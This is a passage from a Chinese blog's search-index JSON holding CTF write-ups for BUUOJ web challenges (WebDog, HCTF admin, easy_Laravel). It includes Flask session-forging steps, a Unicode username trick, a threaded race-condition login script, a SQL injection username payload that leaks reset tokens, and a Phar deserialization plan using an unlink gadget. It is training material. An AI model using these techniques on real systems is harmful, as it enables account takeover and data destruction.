class=\"highlight http\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">GET</span> <span class=\"string\">/?flag</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: node3.buuoj.cn:26215</span><br><span class=\"line\"><span class=\"attribute\">Upgrade-Insecure-Requests</span>: 1</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36 Edg/83.0.478.37</span><br><span class=\"line\"><span class=\"attribute\">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span>: gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span>: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class=\"line\"><span class=\"attribute\">DNT</span>: 1</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: close</span><br><span class=\"line\"><span class=\"attribute\">Proxy</span>: 174.1.23.2:8080</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\r\n<p>Proxy地址指向Linux Labs的IP，上面用nc监听8080端口。在Linux Labs上修改返回包。 <figure class=\"highlight\"><table><tr><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 <span class=\"number\">200</span> OK</span><br><span class=\"line\"><span class=\"attribute\">Server</span>: nginx/1.14.2</span><br><span class=\"line\"><span class=\"attribute\">Date</span>: Mon, 01 Jun 2020 01:30:05 GMT</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: text/html; charset=UTF-8</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: close</span><br><span class=\"line\"><span class=\"attribute\">X-Powered-By</span>: PHP/5.6.23</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span>: 12</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&quot;success&quot;:true&#125;</span><br></pre></td></tr></table></figure></p>\r\n<p>就可以得到flag了。</p>\r\n\n    <div id=\"aplayer-JnNMVJyW\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"4919519\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{d00bc26f-ce1d-406b-8742-91079447e475}</p>\r\n","categories":["Writeups"],"tags":["PHP","Web","BUUOJ"]},{"title":"BUUOJ刷题-Web-WebDog","url":"/2020/04/23/BUUOJ%E5%88%B7%E9%A2%98-Web-WebDog/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>NPUCTF 2020的Web🐕，很基础的AES CBC。</p>\r\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">&#x27;config.php&#x27;</span>);   <span class=\"comment\"># $key,$flag</span></span><br><span class=\"line\">define(<span class=\"string\">&quot;METHOD&quot;</span>, <span class=\"string\">&quot;aes-128-cbc&quot;</span>);  <span class=\"comment\">//定义加密方式</span></span><br><span class=\"line\">define(<span class=\"string\">&quot;SECRET_KEY&quot;</span>, $key);    <span class=\"comment\">//定义密钥</span></span><br><span class=\"line\">define(<span class=\"string\">&quot;IV&quot;</span>,<span class=\"string\">&quot;6666666666666666&quot;</span>);    <span class=\"comment\">//定义初始向量 16个6</span></span><br><span class=\"line\">define(<span class=\"string\">&quot;BR&quot;</span>,<span class=\"string\">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">&#x27;source&#x27;</span>]))header(<span class=\"string\">&#x27;location:./index.php?source=1&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#var_dump($GLOBALS);   //听说你想看这个？</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">aes_encrypt</span>(<span class=\"params\">$iv,$data</span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;--------encrypt---------&quot;</span>.BR;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;IV:&#x27;</span>.$iv.BR;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> base64_encode(openssl_encrypt($data, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)).BR;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">aes_decrypt</span>(<span class=\"params\">$iv,$data</span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> openssl_decrypt(base64_decode($data),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$iv) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;False&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>($_GET[<span class=\"string\">&#x27;method&#x27;</span>]==<span class=\"string\">&#x27;encrypt&#x27;</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $iv = IV;</span><br><span class=\"line\">    $data = $flag;    </span><br><span class=\"line\">    <span class=\"keyword\">echo</span> aes_encrypt($iv,$data);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>($_GET[<span class=\"string\">&#x27;method&#x27;</span>]==<span class=\"string\">&quot;decrypt&quot;</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $iv = @$_POST[<span class=\"string\">&#x27;iv&#x27;</span>];</span><br><span class=\"line\">    $data = @$_POST[<span class=\"string\">&#x27;data&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> aes_decrypt($iv,$data);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;我摊牌了，就是懒得写前端&quot;</span>.BR;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>($_GET[<span class=\"string\">&#x27;source&#x27;</span>]==<span class=\"number\">1</span>)highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\r\n<p>允许我们加密或解密，加密会把$flag的内容加密显示，而解密时允许我们输入IV和密文，用相同的key解密。那么看起来我们可以直接decrypt了，然后发现并不行。注意到21行解密的时候后面还加了个or，当我们解密成功时or的左端为True，那么会直接返回True，参考<a href=\"https://www.php.net/manual/zh/language.operators.logical.php\">这里</a>。所以我们还拿不到明文。</p>\r\n<p>然后发现它用的加密方式是AES CBC，那么就想到AES CBC的两种攻击手法：Padding Oracle和字节反转。Padding Oracle适合在不清楚key和IV的情况下解密密文，这就是我们要的。具体请参考<a href=\"https://ctf-wiki.github.io/ctf-wiki/crypto/blockcipher/mode/padding-oracle-attack-zh/\">这里</a>。Padding Oracle的条件是能分辨正常解密和解密失败的情况，本题解密失败时会返回False，足够区分了。</p>\r\n\n    <div id=\"aplayer-xykJVAYt\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"34040331\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{0e55ec5f-fdee-4455-96a3-20ebd390da59}</p>\r\n","categories":["Writeups"],"tags":["PHP","Web","AES"]},{"title":"BUUOJ刷题-Web-admin","url":"/2019/09/02/BUUOJ%E5%88%B7%E9%A2%98-Web-admin/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>HCTF 2018的admin。</p>\r\n<p>上来让我们注册，同时网页注释提示you are not admin.看来得先拿到admin权限才行。登录后在change_password处发现源代码提示<code>https://github.com/woadsl1234/hctf_flask/</code>，下载看看。</p>\r\n<p>Flask程序，路由在routes.py中，/edit是个假功能，用的SQLAlchemy，没发现什么SQL注入点。在templates.html中有一句{% if current_user.is_authenticated and session['name'] == 'admin' %}，session['name']为admin时显示flag。 <a id=\"more\"></a> # Session欺骗</p>\r\n<p>既然用的Flask，而且看一遍源码，没有对Session进行什么奇怪操作，那么就可以对页面传递过来的Session进行decode。参考<a href=\"https://www.leavesongs.com/PENETRATION/client-session-security.html\">这个</a>，照抄脚本解密cookie。</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python3</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> zlib</span><br><span class=\"line\"><span class=\"keyword\">from</span> base64 <span class=\"keyword\">import</span> b64decode</span><br><span class=\"line\"><span class=\"keyword\">from</span> flask.sessions <span class=\"keyword\">import</span> session_json_serializer</span><br><span class=\"line\"><span class=\"keyword\">from</span> itsdangerous <span class=\"keyword\">import</span> base64_decode</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">decryption</span>(<span class=\"params\">payload</span>):</span></span><br><span class=\"line\">    payload, sig = payload.rsplit(<span class=\"string\">&#x27;.&#x27;</span>, <span class=\"number\">1</span>)</span><br><span class=\"line\">    payload, timestamp = payload.rsplit(<span class=\"string\">&#x27;.&#x27;</span>, <span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    decompress = <span class=\"literal\">False</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> payload.startswith(<span class=\"string\">&#x27;.&#x27;</span>):</span><br><span class=\"line\">        payload = payload[<span class=\"number\">1</span>:]</span><br><span class=\"line\">        decompress = <span class=\"literal\">True</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        payload = base64_decode(payload)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        <span class=\"keyword\">raise</span> Exception(<span class=\"string\">&#x27;Could not base64 decode the payload because of &#x27;</span></span><br><span class=\"line\">                         <span class=\"string\">&#x27;an exception&#x27;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> decompress:</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            payload = zlib.decompress(payload)</span><br><span class=\"line\">        <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">            <span class=\"keyword\">raise</span> Exception(<span class=\"string\">&#x27;Could not zlib decompress the payload before &#x27;</span></span><br><span class=\"line\">                             <span class=\"string\">&#x27;decoding the payload&#x27;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">return</span> session_json_serializer.loads(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    print(decryption(sys.argv[<span class=\"number\">1</span>].encode()))</span><br></pre></td></tr></table></figure>\r\n<p>或者这个</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"><span class=\"keyword\">import</span> zlib</span><br><span class=\"line\"></span><br><span class=\"line\">EXAMPLE_SESSION = <span class=\"string\">&quot;.eJw9kMGOgkAMhl9l07MHVvBC4sEEJJB0JpjiZOZiVFCYATcBjDDGd99ZN_HSy9d-7d8nHC59NdQQjv29WsChKSF8wtcJQmCdtGhTH2kzS7vxpJBLFmUtUmaUKFYYFRMn9NB1KcpnZuMZrQlQKKMS-eAJrjDZaTdlkIzPKPWlzS0mW4P6_FB0nVSybzmVjRL5JG3WYOR4VwRMpzM6h6RNwCm3SuxqHhWBpFK7Xb6iYokiaxXVNSbpGl4LOA_95TD-mOr2iSDp7KGIH6pLJ2ZdHGpbV2cu9hqj2Ps7G_XecCEnFm1d4LJm1_Vb13THa_Ux5br2Kf8nt2PnAIzVMMIC7kPVv98G3x68fgHcO26J.XWzFXA.9Z-Tu9gpzsrd4sNdUecbrNh0rvo&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">decodeCookiePayload</span>():</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> EXAMPLE_SESSION[<span class=\"number\">0</span>] == <span class=\"string\">&#x27;.&#x27;</span>:</span><br><span class=\"line\">        session_payload = EXAMPLE_SESSION[<span class=\"number\">1</span>:].split(<span class=\"string\">&#x27;.&#x27;</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">        print(<span class=\"string\">&quot;Extracted Session datas : &#123;&#125;&quot;</span>.format(session_payload))</span><br><span class=\"line\">        decoded_session_payload = base64.urlsafe_b64decode(session_payload)</span><br><span class=\"line\">        decompressed_session_payload = zlib.decompress(decoded_session_payload)</span><br><span class=\"line\">        print(<span class=\"string\">&quot;Extracted decoded uncompressed datas : &#123;&#125; &quot;</span>.format(decompressed_session_payload))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    print(<span class=\"string\">&quot;Flask Cookie Session Datas Decoder&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    decodeCookiePayload()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\r\n<p>解出来这个东西：<code>&#123;u'csrf_token': 'a741a0fb176319ec329ec014e4225d9f141fc7a6', u'user_id': u'10', u'name': u'test', u'image': 'B8wM', u'_fresh': True, u'_id': '6f3327102c04af642e12dee9051934333e427123981fddf08c90dcccd197527c430ad270e81dee97bed1c2b0432e86220f0a08943eda858a7ce47e561bee8a0b'&#125;</code>。我们看到了name，很容易想到把name改成admin。</p>\r\n<p>到github上找到了<a href=\"https://github.com/noraj/flask-session-cookie-manager\">这个</a>。他要求我们找到SECRET_KEY。在config.py中确实有SECRET_KEY的出现，我们尝试一下ckj123。注意，在源码中我们看不出来是否是Python3，所以两个版本都试一下。注意要把Unicode说明符去掉。用Python3版本替换Cookie后访问index成功得到flag。</p>\r\n<h1 id=\"unicode欺骗\">Unicode欺骗</h1>\r\n<p>在routes.py有关/change的代码中，有一行很奇怪。<code>name=strlower(session['name'])</code>，同样的，在注册的时候也要求name被strlower()处理过。而strlower不是Python自带函数，这个函数来源于twisted.words.protocols.jabber.xmpp_stringprep的nodeprep，那么我们去找一下twisted的文档。注意到一个问题，twisted的版本现在为19.2.0，而题目中要求使用10.2.0，估计问题就出在这里。10.2.0版本的源码在<a href=\"https://github.com/twisted/twisted/blob/releases/release-10.2.0-4651/twisted/words/protocols/jabber/xmpp_stringprep.py\">这里</a>，在nodeprep上和最新版本的没有太大差别。那么我们再去找找，Google \"twisted nodeprep\"，在reddit上找到了<a href=\"https://labs.spotify.com/2013/06/18/creative-usernames/\">这个</a>。简单来讲，Unicode字符有一类拉丁文小字符，nodeprep会将其转成大写。如ᴬ(U+1D2C)，调用nodeprep.prepare()后会变成A，再次调用会变成a。</p>\r\n<p>那么攻击步骤就很明确了：注册一个ᴬdmin用户，登录会变成Admin，然后去修改密码，这时修改的实际上是admin用户的密码。我们就可以直接登录了。</p>\r\n<h1 id=\"条件竞争\">条件竞争</h1>\r\n<p>在源码app/routes.py中login()和change()都可以看到这几行：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> request.method == <span class=\"string\">&#x27;POST&#x27;</span>:</span><br><span class=\"line\">        name = strlower(form.username.data)</span><br><span class=\"line\">        session[<span class=\"string\">&#x27;name&#x27;</span>] = name</span><br><span class=\"line\">        user = User.query.filter_by(username=name).first()</span><br></pre></td></tr></table></figure>\r\n<p>session['name']是先赋的值，后进行数据库查询。因此如果我们先正常登陆得到session，然后用刚才的session再次登录使得session['name']='admin'，然后再change_password就可以改掉密码了。但是正常手段是肯定不行的，正常登录后访问/login直接跳转，我们需要某种方法使得用户成功登陆后取消掉current_user.is_authenticated。我们可以同时开启两个登录进程，一个在登陆后改密码，运行到<code>name=strlower(session['name'])</code>的时候，另一个进程进行logout操作，并尝试以admin用户名登录。session['name']就会变成admin。</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">&quot;http://706ef821-ae29-46f1-9027-2d7189c508a0.node3.buuoj.cn/&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">login</span>(<span class=\"params\">s: requests.sessions.Session, username, password</span>):</span></span><br><span class=\"line\">    data = &#123;<span class=\"string\">&quot;username&quot;</span>: username, <span class=\"string\">&quot;password&quot;</span>: password, <span class=\"string\">&#x27;submit&#x27;</span>: <span class=\"string\">&quot;&quot;</span>&#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> s.post(url=url + <span class=\"string\">&quot;login&quot;</span>, data=data)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">logout</span>(<span class=\"params\">s: requests.sessions.Session</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> s.post(url=url + <span class=\"string\">&quot;logout&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">change</span>(<span class=\"params\">s: requests.sessions.Session, newpass</span>):</span></span><br><span class=\"line\">    data = &#123;<span class=\"string\">&quot;newpassword&quot;</span>: newpass&#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> s.post(url=url, data=data)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">func1</span>(<span class=\"params\">s: requests.sessions.Session</span>):</span></span><br><span class=\"line\">    login(s,<span class=\"string\">&#x27;tiaonmmn&#x27;</span>, <span class=\"string\">&#x27;tiaonmmn&#x27;</span>)</span><br><span class=\"line\">    change(s, <span class=\"string\">&#x27;tiaonmmn&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">func2</span>(<span class=\"params\">s: requests.sessions.Session</span>):</span></span><br><span class=\"line\">    logout(s)</span><br><span class=\"line\">    result = login(s,<span class=\"string\">&#x27;admin&#x27;</span>, <span class=\"string\">&#x27;admin&#x27;</span>)</span><br><span class=\"line\">    print(result.text)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"string\">&quot;Invalid&quot;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> result.text:</span><br><span class=\"line\">        print(result.cookies)</span><br><span class=\"line\">        sys.exit(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1000</span>):</span><br><span class=\"line\">        print(<span class=\"string\">&quot;[+] Round &#123;0&#125;&quot;</span>.format(i))</span><br><span class=\"line\">        s = requests.Session()</span><br><span class=\"line\">        t1 = threading.Thread(target=func1, args=(s,))</span><br><span class=\"line\">        t2 = threading.Thread(target=func2, args=(s,))</span><br><span class=\"line\">        t1.start()</span><br><span class=\"line\">        t2.start()</span><br><span class=\"line\">        time.sleep(<span class=\"number\">0.5</span>)</span><br></pre></td></tr></table></figure>\r\n<p>或者，有另外一种骚操作：源码里给出了Dockerfile，可以知道本题每30分钟清理一次数据库。所以，我们完全可以先注册一个用户，然后登陆，等30分钟后尝试登录admin，再注册相同用户名的账号就会直接得到admin身份。</p>\r\n<p>注册用户后得到一个user_id，30分钟后user_id不存在，数据库查询会失败，我们以admin登录，session['name']='admin'，再次注册后user_id合法，而此时session['name']已经是admin了，直接拿到admin权限。</p>\r\n\n    <div id=\"aplayer-UXBHJlLV\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"28577596\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{ae5d2ccc-ec38-4d66-ad72-f50aa54d43ba}</p>\r\n","categories":["Writeups"],"tags":["Web","BUUOJ","Session","Python","Flask"]},{"title":"BUUOJ刷题-Web-easy_Laravel","url":"/2019/09/04/BUUOJ%E5%88%B7%E9%A2%98-Web-easy-laravel/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>2018 护网杯的Easy_laravel。Laravel是个PHP开发框架。 打开后网页源码提示github上有源码。但是做题的时候源码已经没了，所以我从ctftraining上拖了一份下来。 先看一下数据库。database/factories/ModelFactory.php中记录User的信息，发现用户名和email已知，但是密码是随机生成的。猜测我们要通过SQL注入登录管理员用户了。路由信息在routes/web.php中，对应的Controller在app/Http/Controllers/下对应的PHP文件。Upload和Flag只有admin用户可以访问。 <a id=\"more\"></a> NoteController.php中代码如下： <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">index</span>(<span class=\"params\">Note $note</span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    $username = Auth::user()-&gt;name;</span><br><span class=\"line\">    $notes = DB::select(<span class=\"string\">&quot;SELECT * FROM `notes` WHERE `author`=&#x27;&#123;$username&#125;&#x27;&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> view(<span class=\"string\">&#x27;note&#x27;</span>, compact(<span class=\"string\">&#x27;notes&#x27;</span>));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure> 没有任何过滤。而在app/Http/Controllers/Auth/RegisterController.php中我们可以看到注册用户时的validator对用户名，仅做了最大字符数255的限制，没有过滤任何符号。但我们没办法直接得到admin的密码，因为被bcrypt过了。所以我们选择进行密码重置。在password_resets里当用户发出重置密码的请求时会记录下token，访问/password/reset/{token}就可以重置密码了。 我们注册<code>test'union select 1,token,3,4,5 from password_resets where email='admin@qvq.im';</code>，注意在config/database.php中题目是用的是SQLite数据库，不能使用<code>#</code>，要用<code>;</code>。然后打开note，就会弹出token。访问/password/reset/{token}就可以重置密码了。 登陆后点击flag，发现弹出no flag。FlagController.php里确实有读flag的操作。怎么回事？Laravel自带一套模板框架Blade。Blade模板有模板缓存机制，除非有修改，否则不会重新生成。那大胆猜测一下，这题的/flag页面模板文件被修改了，导致我们无法访问真正的页面。那下一目标就是把缓存的文件删除掉。 来看一下上传文件，允许几种图片文件的后缀，然后就将文件移动到app/public/下，问题是app/public这个目录不允许我们访问。那我们没办法上传一个webshell了。然后就想到，可不可以Phar反序列化呢？check函数中使用了file_exists()，会受Phar文件的影响，而且path和filename完全可控，看来可行。那我们的目标就是找一个会删除文件的类-&gt;构造Phar文件-&gt;上传-&gt;调用check。删除缓存模板文件，重新访问/flag即可得到flag。 我们搜索unlink，然后在vendor/swiftmailer/swiftmailer/lib/classes/Swift/ByteStream/TemporaryFileByteStream.php中发现如下代码： <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Swift_ByteStream_TemporaryFileByteStream</span> <span class=\"keyword\">extends</span> <span class=\"title\">Swift_ByteStream_FileByteStream</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $filePath = tempnam(sys_get_temp_dir(), <span class=\"string\">&#x27;FileByteStream&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> ($filePath === <span class=\"literal\">false</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> Swift_IoException(<span class=\"string\">&#x27;Failed to retrieve temporary file name.&#x27;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"built_in\">parent</span>::__construct($filePath, <span class=\"literal\">true</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getContent</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (($content = file_get_contents(<span class=\"keyword\">$this</span>-&gt;getPath())) === <span class=\"literal\">false</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> Swift_IoException(<span class=\"string\">&#x27;Failed to get temporary file content.&#x27;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"keyword\">return</span> $content;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (file_exists(<span class=\"keyword\">$this</span>-&gt;getPath())) &#123;</span><br><span class=\"line\">            @unlink(<span class=\"keyword\">$this</span>-&gt;getPath());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure> __destruct与unlink，完全符合我们的条件。因此可以反序列化这个了。getPath()函数需要的参数是_path，将其指向我们需要的文件名即可。下一步是缓存的文件名是什么？ 网上似乎没太多资料，那我们翻代码好了。vendor/laravel/framework/src/Illuminate/View/Compilers/BladeCompiler.php中有一段代码： <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">compile</span>(<span class=\"params\">$path = <span class=\"literal\">null</span></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($path) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;setPath($path);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (! is_null(<span class=\"keyword\">$this</span>-&gt;cachePath)) &#123;</span><br><span class=\"line\">        $contents = <span class=\"keyword\">$this</span>-&gt;compileString(<span class=\"keyword\">$this</span>-&gt;files-&gt;get(<span class=\"keyword\">$this</span>-&gt;getPath()));</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;files-&gt;put(<span class=\"keyword\">$this</span>-&gt;getCompiledPath(<span class=\"keyword\">$this</span>-&gt;getPath()), $contents);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>而getCompiledPath代码为： <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getCompiledPath</span>(<span class=\"params\">$path</span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;cachePath . <span class=\"string\">&#x27;/&#x27;</span> . sha1($path) . <span class=\"string\">&#x27;.php&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure> 